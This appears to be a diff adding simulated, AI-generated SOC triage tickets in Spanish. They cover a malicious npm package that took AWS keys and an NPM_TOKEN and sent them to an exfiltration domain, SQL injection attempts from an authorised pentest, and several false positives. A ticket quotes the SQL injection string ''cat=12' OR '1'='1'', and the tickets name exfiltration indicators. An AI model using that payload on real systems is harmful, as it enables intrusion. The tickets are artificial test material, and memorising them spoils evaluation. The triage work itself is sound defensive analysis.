+      },
+      {
+        "source": "evidencia",
+        "event_id": "A01175",
+        "finding": "CI-RUNNER01 es un runner de criticidad alta en AWS-PROD que ejecuta los builds de la tienda online y contiene en variables de entorno la clave de despliegue de AWS (svc_ecom_deploy)."
+      },
+      {
+        "source": "evidencia",
+        "event_id": "npm-telemetry-stats.example",
+        "finding": "La inteligencia de amenazas marca el dominio como unknown (sin información), y los cambios aprobados del entorno están vacíos, descartando una autorización citable."
+      }
+    ],
+    "enrichment": [
+      {
+        "indicator": "npm-telemetry-stats.example",
+        "type": "domain",
+        "source": "ti_feed",
+        "result": "sin coincidencias en el TIP (desconocido, no limpio)"
+      },
+      {
+        "indicator": "f412c70fef24e226c48b62c885087042fb88ddae0df4f4d5386f4b48156a676c",
+        "type": "sha256",
+        "source": "ti_feed",
+        "result": "sin coincidencias en el TIP (desconocido, no limpio)"
+      },
+      {
+        "indicator": "f412c70fef24e226c48b62c885087042fb88ddae0df4f4d5386f4b48156a676c",
+        "type": "sha256",
+        "source": "sandbox",
+        "result": "malicious, puntuación 90, Paquete npm malicioso (dependency confusion)"
+      }
+    ],
+    "mitre": [
+      "T1195.002",
+      "T1552.001"
+    ],
+    "recommended_actions": [
+      {
+        "action": "block_ioc",
+        "target": "npm-telemetry-stats.example y 203.0.113.170 en proxy, correo y EDR",
+        "requires_approval": false,
+        "justification": "Dominio e IP de exfiltración confirmados por sandbox; bloquearlos evita reintentos y comunicación posterior del atacante.",
+        "aprobador": "—",
+        "permitida": true,
+        "nota": ""
+      },
+      {
+        "action": "revoke_sessions",
+        "target": "Credenciales de despliegue AWS (svc_ecom_deploy) en CI-RUNNER01",
+        "requires_approval": true,
+        "justification": "El runner expuso AWS_ACCESS_KEY_ID/AWS_SECRET_ACCESS_KEY a un paquete malicioso; hay riesgo real de compromiso de la cuenta de despliegue tarvia-prod.",
+        "aprobador": "N2",
+        "permitida": true,
+        "nota": ""
+      },
+      {
+        "action": "disable_access_key",
+        "target": "Claves de acceso AWS asociadas al runner y rotación del NPM_TOKEN",
+        "requires_approval": true,
+        "justification": "El postinstall leyó las claves AWS y el NPM_TOKEN; deben rotarse y revocarse las claves activas.",
+        "aprobador": "N2",
+        "permitida": true,
+        "nota": ""
+      }
+    ],
+    "executed_actions": [],
+    "escalation": {
+      "escalate": true,
+      "to": "A N2 en la misma jornada",
+      "reason": "true_positive de severidad high; ejecución o acceso confirmado"
+    },
+    "open_questions": [
+      "¿Se ha rotado ya la clave de despliegue AWS (svc_ecom_deploy) y el NPM_TOKEN expuestos en el runner?",
+      "¿Hay actividad posterior sospechosa desde CI-RUNNER01 o desde la cuenta de despliegue AWS tras el POST del 13-10 a las 12:22?",
+      "¿Qué permisos tenía la clave svc_ecom_deploy en tarvia-prod y se ha detectado uso no autorizado tras la exfiltración?",
+      "¿Se ha revisado si el paquete malicioso dejó persistencia o si otros builds consumieron tarvia-checkout-utils@9.9.1?"
+    ],
+    "triage_seconds": 20,
+    "decision": "escalar",
+    "sla": {
+      "tiempo_triaje": "30 min",
+      "escalado": "A N2 en la misma jornada",
+      "notificar": "Responsable SOC"
+    },
+    "veredicto_llm": "true_positive",
+    "modelo": "ornith"
+  },
+  {
+    "ticket_id": "TKT-20261008-011833",
+    "alert_ids": [
+      "ALR-20261008-011833"
+    ],
+    "title": "Escaneo de inyección SQL contra la tienda online durante el pentest autorizado",
+    "verdict": "benign_true_positive",
+    "confidence": 0.97,
+    "severity": "low",
+    "severity_rationale": "Actividad autorizada (CHG-2026-1042: Pentest externo de la tienda online (2026-10-08 08:00 – 2026-10-10 18:00)): la política la deja en low (la matriz daría medium). Criticidad Crítica del servicio afectado: Tienda online y app (frontales web).",
+    "affected": {
+      "users": [],
+      "hosts": [],
+      "business_services": [
+        "Tienda online y app (frontales web)"
+      ],
+      "customers": []
+    },
+    "summary": "El WAF bloqueó 56 intentos de inyección SQL (firma 942100) contra https://www.tarvia.example/api/v1/products?cat=12' OR '1'='1 procedentes de 192.0.2.11, con user_agent 'pentest-auditoria-tarvia'. La IP pertenece a la auditoria externa (AS64620, descrita como pentest autorizado, simulado) y cae dentro del cambio aprobado CHG-2026-1042, que autoriza el escaneo de www.tarvia.example y la API desde las IPs 192.0.2.10-12 del 8 al 10 de octubre. No hay autenticación ni acceso a la aplicación (0 eventos en ecom_auth/ecom_account) y todas las peticiones fueron bloqueadas (403) sin actividad posterior, por lo que es actividad de auditoria autorizada y no compromiso.",
+    "evidence": [
+      {
+        "source": "alerta",
+        "event_id": "ALR-20261008-011833",
+        "finding": "Regla UC-WEB-001 del WAF detectó firma de inyección SQL contra /api/v1/products desde 192.0.2.11 con 56 hits y action=blocked."
+      },
+      {
+        "source": "waf",
+        "event_id": "WAF-0074548",
+        "finding": "Peticiones GET con uri de inyección SQL, status 403, action blocked y user_agent 'pentest-auditoria-tarvia' desde 192.0.2.11."
+      },
+      {
+        "source": "inteligencia",
+        "event_id": "192.0.2.11",
+        "finding": "La IP origen es AS64620, identificada como auditoria externa (pentest autorizado, simulado), desde Madrid, España."
+      },
+      {
+        "source": "cambios_aprobados",
+        "event_id": "CHG-2026-1042",
+        "finding": "Cambio aprobado que autoriza el pentest de la tienda online y la API desde las IPs 192.0.2.10-12 del 2026-10-08 08:00 al 2026-10-10 18:00, alcanzando www.tarvia.example y api."
+      },
+      {
+        "source": "contexto_logs",
+        "event_id": "ecom_auth",
+        "finding": "0 eventos de autenticación y 0 de cuenta de usuario desde 192.0.2.11: no hubo login ni acceso a la aplicación."
+      },
+      {
+        "source": "contexto_logs",
+        "event_id": "waf",
+        "finding": "Continuidad de peticiones bloqueadas (403) de la misma IP y firma tras la alerta, sin cambios de estado ni actividad posterior."
+      }
+    ],
+    "enrichment": [
+      {
+        "indicator": "192.0.2.11",
+        "type": "ip",
+        "source": "ti_feed",
+        "result": "sin coincidencias en el TIP (desconocido, no limpio)"
+      },
+      {
+        "indicator": "192.0.2.11",
+        "type": "ip",
+        "source": "geoip_asn",
+        "result": "Auditora externa (pentest autorizado, simulado), Madrid, ES, hosting"
+      },
+      {
+        "indicator": "www.tarvia.example",
+        "type": "domain",
+        "source": "ti_feed",
+        "result": "sin coincidencias en el TIP (desconocido, no limpio)"
+      }
+    ],
+    "mitre": [
+      "T1190"
+    ],
+    "recommended_actions": [
+      {
+        "action": "close",
+        "target": "ticket",
+        "requires_approval": false,
+        "justification": "Actividad autorizada (CHG-2026-1042: Pentest externo de la tienda online (2026-10-08 08:00 – 2026-10-10 18:00)): la política la deja en low (la matriz daría medium).",
+        "aprobador": "—",
+        "permitida": true,
+        "nota": ""
+      }
+    ],
+    "executed_actions": [],
+    "escalation": {
+      "escalate": false,
+      "to": "",
+      "reason": ""
+    },
+    "open_questions": [
+      "Verificar en el informe del pentest que el alcance incluye explícitamente el parámetro 'cat' del endpoint /api/v1/products para descartar escaneo fuera de alcance."
+    ],
+    "triage_seconds": 13,
+    "decision": "cerrar",
+    "sla": {
+      "tiempo_triaje": "24 h",
+      "escalado": "No",
+      "notificar": "—"
+    },
+    "veredicto_llm": "benign_true_positive",
+    "modelo": "ornith"
+  },
+  {
+    "ticket_id": "TKT-20261005-000395",
+    "alert_ids": [
+      "ALR-20261005-000395"
+    ],
+    "title": "PowerShell con comando codificado ejecutado por el agente SCCM en un portátil de HQ",
+    "verdict": "false_positive",
+    "confidence": 0.95,
+    "severity": "informational",
+    "severity_rationale": "Falso positivo: severidad informational (la matriz daría medium). Criticidad Media del activo WS-BCN-1993 (Portátil), según la CMDB.",
+    "affected": {
+      "users": [],
+      "hosts": [
+        "WS-BCN-1993"
+      ],
+      "business_services": [
+        "Puesto de trabajo"
+      ],
+      "customers": []
+    },
+    "summary": "La regla UC-EDR-002 detectó una ejecución de PowerShell con -EncodedCommand en el portátil WS-BCN-1993, pero el proceso fue iniciado por CcmExec.exe (el agente del cliente de Configuration Manager/SCCM) ejecutando como NT AUTHORITY\\SYSTEM. El comando descodificado es una consulta rutinaria de inventario de software (Get-CimInstance Win32_Product volcada a C:\\Windows\\CCM\\Inventory\\sw.json), que es exactamente la función para la que funciona el agente SCCM. No existe ningún cambio aprobado ni flujo autorizado citable, por lo que corresponde un false_positive: la actividad es legítima y administrativa, no un ataque. El contexto del host confirma uso normal del usuario (Office, Chrome, Teams, SharePoint, Salesforce) y no hay tráfico sospechoso ni actividad posterior.",
+    "evidence": [
+      {
+        "source": "edr_events",
+        "event_id": "EDR-0005357",
+        "finding": "powershell.exe iniciado por CcmExec.exe (padre, pid 1880) como NT AUTHORITY\\SYSTEM con -EncodedCommand; el comando descodificado es '$inv = Get-CimInstance Win32_Product | Select Name,Version | ConvertTo-Json | Out-File C:\\Windows\\CCM\\Inventory\\sw.json'."
+      },
+      {
+        "source": "alerta",
+        "event_id": "",
+        "finding": "La alerta indica explícitamente que el padre es CcmExec.exe (agente SCCM) y que el preview descodificado es una volcado de inventario de software a C:\\Windows\\CCM\\Inventory\\sw.json."
+      },
+      {
+        "source": "edr_events",
+        "event_id": "EDR-0004885",
+        "finding": "El host WS-BCN-1993 pertenece a david.sanz en zona HQ-USERS, criticidad Media, sin exposición a Internet; el resto de eventos del día son uso normal de oficina (EXCEL, chrome, OUTLOOK, Acrobat, ms-teams)."
+      },
+      {
+        "source": "proxy",
+        "event_id": "PRX-0008693",
+        "finding": "El tráfico del host en la ventana es solo a destinos corporativos legítimos (api.anthropic.com, login.microsoftonline.com, sharepoint.com, salesforce.com, s3.amazonaws.com), sin comunicación con infraestructura sospechosa."
+      },
+      {
+        "source": "alerta",
+        "event_id": "",
+        "finding": "No hay cambios aprobados ni flujos autorizados en el contexto, y la inteligencia de indicadores y el sandbox están vacíos (indicador sin información)."
+      }
+    ],
+    "enrichment": [],
+    "mitre": [
+      "T1059.001"
+    ],
+    "recommended_actions": [
+      {
+        "action": "close",
+        "target": "ticket",
+        "requires_approval": false,
+        "justification": "Falso positivo: severidad informational (la matriz daría medium).",
+        "aprobador": "—",
+        "permitida": true,
+        "nota": ""
+      }
+    ],
+    "executed_actions": [],
+    "escalation": {
+      "escalate": false,
+      "to": "",
+      "reason": ""
+    },
+    "open_questions": [
+      "¿Convierte ajustar la regla para excluir las ejecuciones de PowerShell originadas por CcmExec.exe con destino a C:\\Windows\\CCM\\Inventory, evitando falsos positivos recurrentes?"
+    ],
+    "triage_seconds": 14,
+    "decision": "cerrar",
+    "sla": {
+      "tiempo_triaje": "Revisión en lote diaria",
+      "escalado": "No",
+      "notificar": "—"
+    },
+    "veredicto_llm": "false_positive",
+    "modelo": "ornith"
+  },
+  {
+    "ticket_id": "TKT-20261005-000043",
+    "alert_ids": [
+      "ALR-20261005-000043"
+    ],
+    "title": "Inicio de sesión de Javier Sanz desde Barcelona y luego desde Dublín en menos de 30 minutos",
+    "verdict": "false_positive",
+    "confidence": 0.85,
+    "severity": "informational",
+    "severity_rationale": "Falso positivo: severidad informational (la matriz daría medium). Sin activo conocido en la CMDB: se asume criticidad Media (dato a revisar).",
+    "affected": {
+      "users": [
+        "javier.sanz@tarvia.example"
+      ],
+      "hosts": [],
+      "business_services": [],
+      "customers": []
+    },
+    "summary": "La regla «Viaje imposible» dispara por dos inicios de sesión exitosos del usuario Javier Sanz en menos de 30 minutos desde Barcelona (198.18.200.10) y Dublín (198.18.10.185). Sin embargo, el segundo origen es la salida de Private Relay/VPN del propio móvil corporativo (Microsoft, Irlanda), un mecanismo legítimo de privacidad del dispositivo, no un acceso real desde Irlanda. El primer inicio de sesión ya se repite en otras 200 sesiones de usuarios distintos desde la misma IP 198.18.200.10, lo que confirma que es la salida corporativa habitual de Barcelona, no un origen geográfico único. No existe autorización explícita que citar, pero la actividad detectada no es un ataque: es el comportamiento normal de un usuario con móvil corporativo conforme usando VPN/Private Relay, por lo que la regla se equivoca.",
+    "evidence": [
+      {
+        "source": "alerta",
+        "event_id": "ALR-20261005-000043",
+        "finding": "La regla «Viaje imposible» marca dos inicios de sesión incompatibles en el tiempo para Javier Sanz: Barcelona (198.18.200.10) y Dublín (198.18.10.185) en menos de 30 minutos, con dispositivo «móvil corporativo conocido y conforme."
+      },
+      {
+        "source": "alerta",
+        "event_id": "SIGN-0003550",
+        "finding": "El segundo inicio de sesión (Outlook-iOS en iPhone) proviene de 198.18.10.185 en Dublín, Irlanda, con AS8075 «Microsoft (salida de Private Relay/VPN del móvil, simulado)», device_compliant=true y MFA TOTP satisfecho; es la salida VPN del propio dispositivo, no un acceso físico desde Irlanda."
+      },
+      {
+        "source": "alerta",
+        "event_id": "SIGN-0003549",
+        "finding": "El primer inicio de sesión (Microsoft Teams en Edge/Windows) proviene de 198.18.200.10 en Barcelona, ES, con device_compliant=true y MFA TOTP satisfecho; el primer login real es legítimo."
+      },
+      {
+        "source": "alerta",
+        "event_id": "ALR-20261005-000043",
+        "finding": "La inteligencia de la IP 198.18.10.185 la clasifica como proveedor de hosting de Microsoft (salida de Private Relay/VPN del móvil), no como ubicación real de inicio de sesión."
+      },
+      {
+        "source": "alerta",
+        "event_id": "SIGN-0002714",
+        "finding": "La IP 198.18.200.10 de Barcelona aparece en otras 200 sesiones de usuarios distintos (celia.riera, ivan.ortega, patricia.marin, paula.pujol...) en el mismo rango horario, confirmando que es una salida corporativa compartida de HQ, no un origen geográfico único del usuario."
+      },
+      {
+        "source": "alerta",
+        "event_id": "ALR-20261005-000043",
+        "finding": "El usuario Javier Sanz no es VIP ni privilegiado (department=Marketing, title=Especialista CRM, privileged=False, vip=False); el móvil corporativo está conforme y todas las sesiones usan MFA TOTP con conditional_access=success."
+      }
+    ],
+    "enrichment": [
+      {
+        "indicator": "198.18.200.10",
+        "type": "ip",
+        "source": "ti_feed",
+        "result": "sin coincidencias en el TIP (desconocido, no limpio)"
+      },
+      {
+        "indicator": "198.18.200.10",
+        "type": "ip",
+        "source": "geoip_asn",
+        "result": "Orange Espagne, Madrid, ES"
+      },
+      {
+        "indicator": "198.18.10.185",
+        "type": "ip",
+        "source": "ti_feed",
+        "result": "sin coincidencias en el TIP (desconocido, no limpio)"
+      },
+      {
+        "indicator": "198.18.10.185",
+        "type": "ip",
+        "source": "geoip_asn",
+        "result": "Microsoft (salida de Private Relay/VPN del móvil, simulado), Dublín, IE, hosting"
+      }
+    ],
+    "mitre": [
+      "T1078.001",
+      "T1078"
+    ],
+    "recommended_actions": [
+      {
+        "action": "close",
+        "target": "ticket",
+        "requires_approval": false,
+        "justification": "Falso positivo: severidad informational (la matriz daría medium).",
+        "aprobador": "—",
+        "permitida": true,
+        "nota": ""
+      }
+    ],
+    "executed_actions": [],
+    "escalation": {
+      "escalate": false,
+      "to": "",
+      "reason": ""
+    },
+    "open_questions": [
+      "Confirmar con el equipo de identidad que la salida 198.18.10.185 corresponde efectivamente a Microsoft Private Relay del dispositivo mob-28a90bad y no a un reenvío malicioso.",
+      "Verificar si la regla «Viaje imposible» debería excluir las salidas de Private Relay/VPN del móvil de la lógica de geolocalización."
+    ],
+    "triage_seconds": 17,
+    "decision": "cerrar",
+    "sla": {
+      "tiempo_triaje": "Revisión en lote diaria",
+      "escalado": "No",
+      "notificar": "—"
+    },
+    "veredicto_llm": "false_positive",
+    "modelo": "ornith"
+  },
+  {
+    "ticket_id": "TKT-20261005-000456",
+    "alert_ids": [
+      "ALR-20261005-000456"
+    ],
+    "title": "Consultas DNS a subdominios largos de avqs.mcafee.com desde un portátil de Barcelona",
+    "verdict": "false_positive",
+    "confidence": 0.8,
+    "severity": "informational",
+    "severity_rationale": "Falso positivo: severidad informational (la matriz daría medium). Criticidad Media del activo WS-BCN-1223 (Portátil), según la CMDB.",
+    "affected": {
+      "users": [],
+      "hosts": [
+        "WS-BCN-1223"
+      ],
+      "business_services": [
+        "Puesto de trabajo"
+      ],
+      "customers": []
+    },
+    "summary": "La regla detecta un posible túnel DNS por más de 200 consultas en 1 h a subdominios largos de avqs.mcafee.com desde WS-BCN-1223. La evidencia muestra que todas las consultas responden a 127.0.0.2 con NOERROR, patrón típico de resolución local de un agente de seguridad (Mcafee) y no de exfiltración. El dominio no aparece en los logs de firewall ni proxy, lo que descarta tráfico saliente real. El propio host realiza navegación web normal (Google, banca, Salesforce) en el mismo periodo. La actividad es rutinaria de software de gestión y no existe autorización explícita citable que la justifique como caso autorizado.",
+    "evidence": [
+      {
+        "source": "alerta",
+        "event_id": "ALR-20261005-000456",
+        "finding": "La regla UC-NET-006 marca posible túnel DNS con 305 consultas en 1 h, longitud media de etiqueta 48 y dominio padre avqs.mcafee.com."
+      },
+      {
+        "source": "alerta",
+        "event_id": "ALR-20261005-000456",
+        "finding": "El indicador avqs.mcafee.com tiene estado 'unknown' en la inteligencia recopilada, sin clasificación como C2 o túnel."
+      },
+      {
+        "source": "eventos_citados_en_la_alerta",
+        "event_id": "DNS-0008400",
+        "finding": "Las consultas a subdominios largos de avqs.mcafee.com responden todas a 127.0.0.2 con NOERROR, patrón de resolución local, no de canal externo."
+      },
+      {
+        "source": "contexto_logs",
+        "event_id": "DNS-0016793",
+        "finding": "Otro host (WS-MAD-1925) resuelve el mismo dominio a 127.0.0.2 el día siguiente, indicando un comportamiento extendido por la red, no un incidente aislado."
+      },
+      {
+        "source": "contexto_logs",
+        "event_id": "DNS-0001820",
+        "finding": "El host WS-BCN-1223 realiza navegación web normal (akamaized.net, Google, Caixabank, Salesforce) en el mismo periodo."
+      },
+      {
+        "source": "contexto_logs",
+        "event_id": "firewall_avqs",
+        "finding": "No hay ningún registro de firewall ni proxy para avqs.mcafee.com, lo que descarta tráfico saliente real hacia ese dominio."
+      },
+      {
+        "source": "contexto_logs",
+        "event_id": "EDR-0005359",
+        "finding": "Un PowerShell con comando codificado ejecutado por CcmExec.exe (inventario de software SCCM) confirma actividad de gestión rutinaria en el host, aunque no está vinculado directamente al dominio."
+      }
+    ],
+    "enrichment": [
+      {
+        "indicator": "avqs.mcafee.com",
+        "type": "domain",
+        "source": "ti_feed",
+        "result": "sin coincidencias en el TIP (desconocido, no limpio)"
+      }
+    ],
+    "mitre": [
+      "T1048.003"
+    ],
+    "recommended_actions": [
+      {
+        "action": "close",
+        "target": "ticket",
+        "requires_approval": false,
+        "justification": "Falso positivo: severidad informational (la matriz daría medium).",
+        "aprobador": "—",
+        "permitida": true,
+        "nota": ""
+      }
+    ],
+    "executed_actions": [],
+    "escalation": {
+      "escalate": false,
+      "to": "",
+      "reason": ""
+    },
+    "open_questions": [
+      "Confirmar con el equipo de seguridad qué agente/producto de Mcafee usa avqs.mcafee.com para resolución local (127.0.0.2).",
+      "Verificar si el patrón se repite en otros hosts y si corresponde a un servicio legítimo de actualización o telemetría del agente."
+    ],
+    "triage_seconds": 18,
+    "decision": "cerrar",
+    "sla": {
+      "tiempo_triaje": "Revisión en lote diaria",
+      "escalado": "No",
+      "notificar": "—"
+    },
+    "veredicto_llm": "false_positive",
+    "modelo": "ornith"
+  }
+]
